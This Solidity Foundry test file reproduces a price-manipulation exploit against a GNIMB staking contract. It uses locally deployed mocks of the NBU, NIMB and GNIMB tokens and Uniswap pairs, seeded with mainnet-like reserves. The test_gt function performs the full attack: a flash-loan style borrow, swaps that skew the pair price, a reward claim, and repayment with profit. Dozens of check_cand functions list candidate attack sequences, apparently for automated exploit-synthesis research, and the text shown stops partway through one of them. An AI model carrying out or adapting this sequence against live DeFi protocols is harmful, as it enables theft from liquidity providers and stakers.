// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./AttackContract.sol";
import "./GNIMB.sol";
import "./GNIMBStaking.sol";
import "./NBU.sol";
import "./NIMB.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract NMBTest is Test, BlockLoader {
    NBU nbu;
    NIMB nimb;
    GNIMB gnimb;
    UniswapV2Pair pairnbunimb;
    UniswapV2Pair pairnbugnimb;
    UniswapV2Factory factory;
    UniswapV2Router router;
    GNIMBStaking gnimbstaking;
    AttackContract attackContract;
    address owner;
    address attacker;
    address nbuAddr;
    address nimbAddr;
    address gnimbAddr;
    address pairnbunimbAddr;
    address pairnbugnimbAddr;
    address factoryAddr;
    address routerAddr;
    address gnimbstakingAddr;
    address attackContractAddr;
    uint256 blockTimestamp = 1670230642;
    uint112 reserve0pairnbugnimb = 9725236852721155802678243;
    uint112 reserve1pairnbugnimb = 1016511225892673227992;
    uint32 blockTimestampLastpairnbugnimb = 1670230307;
    uint256 kLastpairnbugnimb = 0;
    uint256 price0CumulativeLastpairnbugnimb =
        1052794457038217438668234057466281170;
    uint256 price1CumulativeLastpairnbugnimb =
        74014029905778659822139811585719758857071408;
    uint112 reserve0pairnbunimb = 265071137919497555608;
    uint112 reserve1pairnbunimb = 62674388176321590559182896;
    uint32 blockTimestampLastpairnbunimb = 1670230307;
    uint256 kLastpairnbunimb = 0;
    uint256 price0CumulativeLastpairnbunimb =
        419368656836799758243830020230033253638360300;
    uint256 price1CumulativeLastpairnbunimb =
        7839726508306236780654780670054918;
    uint256 totalSupplygnimb = 100000000000000000000000000;
    uint256 balanceOfgnimbpairnbugnimb = 9725236852721155802678243;
    uint256 balanceOfgnimbpairnbunimb = 0;
    uint256 balanceOfgnimbattacker = 0;
    uint256 balanceOfgnimbnbustaking = 7773233890289044800124719;
    uint256 totalSupplynimb = 10000000000000000000000000000;
    uint256 balanceOfnimbpairnbugnimb = 0;
    uint256 balanceOfnimbpairnbunimb = 62674388176321590559182896;
    uint256 balanceOfnimbattacker = 0;
    uint256 balanceOfnimbnbustaking = 0;
    uint256 totalSupplynbu = 2466245080770284349640;
    uint256 balanceOfnbupairnbugnimb = 1016511225892673227992;
    uint256 balanceOfnbupairnbunimb = 265071137919497555608;
    uint256 balanceOfnbuattacker = 0;
    uint256 balanceOfnbunbustaking = 0;

    function setUp() public {
        owner = address(this);
        nbu = new NBU();
        nbuAddr = address(nbu);
        nimb = new NIMB();
        nimbAddr = address(nimb);
        gnimb = new GNIMB();
        gnimbAddr = address(gnimb);
        pairnbunimb = new UniswapV2Pair(
            address(nbu),
            address(nimb),
            reserve0pairnbunimb,
            reserve1pairnbunimb,
            blockTimestampLastpairnbunimb,
            kLastpairnbunimb,
            price0CumulativeLastpairnbunimb,
            price1CumulativeLastpairnbunimb
        );
        pairnbunimbAddr = address(pairnbunimb);
        pairnbugnimb = new UniswapV2Pair(
            address(gnimb),
            address(nbu),
            reserve0pairnbugnimb,
            reserve1pairnbugnimb,
            blockTimestampLastpairnbugnimb,
            kLastpairnbugnimb,
            price0CumulativeLastpairnbugnimb,
            price1CumulativeLastpairnbugnimb
        );
        pairnbugnimbAddr = address(pairnbugnimb);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pairnbunimb),
            address(pairnbugnimb),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        gnimbstaking = new GNIMBStaking(
            address(nbu),
            address(nimb),
            address(gnimb),
            address(router),
            50
        );
        gnimbstakingAddr = address(gnimbstaking);
        attackContract = new AttackContract();
        attackContractAddr = address(attackContract);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        nbu.transfer(address(pairnbunimb), balanceOfnbupairnbunimb);
        nimb.transfer(address(pairnbunimb), balanceOfnimbpairnbunimb);
        nbu.transfer(address(pairnbugnimb), balanceOfnbupairnbugnimb);
        gnimb.transfer(address(pairnbugnimb), balanceOfgnimbpairnbugnimb);
        gnimb.transfer(address(gnimbstaking), 1500000 ether);
        gnimb.transfer(attacker, 150000 ether);
        attackContract.setUp(address(gnimb), address(gnimbstaking));
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Nbu Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(nbu), nbu.decimals());
        queryERC20BalanceDecimals(address(nimb), address(nbu), nimb.decimals());
        queryERC20BalanceDecimals(
            address(gnimb),
            address(nbu),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Nimb Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(nimb), nbu.decimals());
        queryERC20BalanceDecimals(
            address(nimb),
            address(nimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(nimb),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Gnimb Balances: ");
        queryERC20BalanceDecimals(address(nbu), address(gnimb), nbu.decimals());
        queryERC20BalanceDecimals(
            address(nimb),
            address(gnimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(gnimb),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Pairnbunimb Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(pairnbunimb),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(pairnbunimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(pairnbunimb),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Pairnbugnimb Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(pairnbugnimb),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(pairnbugnimb),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(pairnbugnimb),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Gnimbstaking Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(gnimbstaking),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(gnimbstaking),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(gnimbstaking),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("Attackcontract Balances: ");
        queryERC20BalanceDecimals(
            address(nbu),
            address(attackContract),
            nbu.decimals()
        );
        queryERC20BalanceDecimals(
            address(nimb),
            address(attackContract),
            nimb.decimals()
        );
        queryERC20BalanceDecimals(
            address(gnimb),
            address(attackContract),
            gnimb.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return nbu.balanceOf(attacker) >= 1e18 + balanceOfnbuattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_owner_nbu(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        nbu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_nbu(uint256 amount) internal {
        nbu.transfer(owner, amount);
    }

    function borrow_owner_nimb(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        nimb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_nimb(uint256 amount) internal {
        nimb.transfer(owner, amount);
    }

    function borrow_owner_gnimb(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(owner);
        gnimb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_owner_gnimb(uint256 amount) internal {
        gnimb.transfer(owner, amount);
    }

    function borrow_pairnbunimb_nbu(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pairnbunimb));
        nbu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pairnbunimb_nbu(uint256 amount) internal {
        nbu.transfer(address(pairnbunimb), amount);
    }

    function borrow_pairnbunimb_nimb(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pairnbunimb));
        nimb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pairnbunimb_nimb(uint256 amount) internal {
        nimb.transfer(address(pairnbunimb), amount);
    }

    function borrow_pairnbunimb_gnimb(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pairnbunimb));
        gnimb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pairnbunimb_gnimb(uint256 amount) internal {
        gnimb.transfer(address(pairnbunimb), amount);
    }

    function borrow_pairnbugnimb_nbu(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pairnbugnimb));
        nbu.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pairnbugnimb_nbu(uint256 amount) internal {
        nbu.transfer(address(pairnbugnimb), amount);
    }

    function borrow_pairnbugnimb_nimb(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pairnbugnimb));
        nimb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pairnbugnimb_nimb(uint256 amount) internal {
        nimb.transfer(address(pairnbugnimb), amount);
    }

    function borrow_pairnbugnimb_gnimb(uint256 amount) internal {
        vm.stopPrank();
        vm.prank(address(pairnbugnimb));
        gnimb.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_pairnbugnimb_gnimb(uint256 amount) internal {
        gnimb.transfer(address(pairnbugnimb), amount);
    }

    function swap_pairnbunimb_nbu_nimb(uint256 amount) internal {
        nbu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(nbu);
        path[1] = address(nimb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pairnbunimb_nimb_nbu(uint256 amount) internal {
        nimb.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(nimb);
        path[1] = address(nbu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pairnbugnimb_gnimb_nbu(uint256 amount) internal {
        gnimb.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(gnimb);
        path[1] = address(nbu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pairnbugnimb_nbu_gnimb(uint256 amount) internal {
        nbu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(nbu);
        path[1] = address(gnimb);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pairnbunimb() internal {
        pairnbunimb.sync();
    }

    function sync_pairnbugnimb() internal {
        pairnbugnimb.sync();
    }

    function transaction_gnimbstaking_gnimb(uint256 amount) internal {
        gnimbstaking.getReward();
    }

    function test_gt() public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        borrow_owner_nimb(100000000e18);
        printBalance("After step0 ");
        swap_pairnbunimb_nimb_nbu(nimb.balanceOf(attacker));
        printBalance("After step1 ");
        transaction_gnimbstaking_gnimb(0);
        printBalance("After step2 ");
        swap_pairnbunimb_nbu_nimb(nbu.balanceOf(attacker));
        printBalance("After step3 ");
        swap_pairnbugnimb_gnimb_nbu(gnimb.balanceOf(attacker));
        printBalance("After step4 ");
        swap_pairnbunimb_nbu_nimb(3e18);
        printBalance("After step5 ");
        payback_owner_nimb((100000000e18 * 1003) / 1000);
        printBalance("After step6 ");
        require(attackGoal(), "Attack failed!");
        vm.stopPrank();
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        payback_owner_nimb(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand000(uint256 amt0) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nbu_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_nbu_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(uint256 amt0, uint256 amt1) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_gnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nbu_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nbu_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand016(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_nbu_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand017(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand018(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_gnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand019(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand020(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_gnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand021(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand022(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand023(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand024(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand025(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand026(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand027(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand028(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand029(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nbu_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand030(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand031(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_nbu_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand032(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand033(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_gnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand034(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand035(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand036(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand037(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand038(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nbu_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand039(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand040(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand041(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_nbu_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand042(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand043(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand044(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand045(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand046(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nbu(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand047(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand048(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand049(uint256 amt0, uint256 amt1, uint256 amt2) public {
        vm.startPrank(attacker);
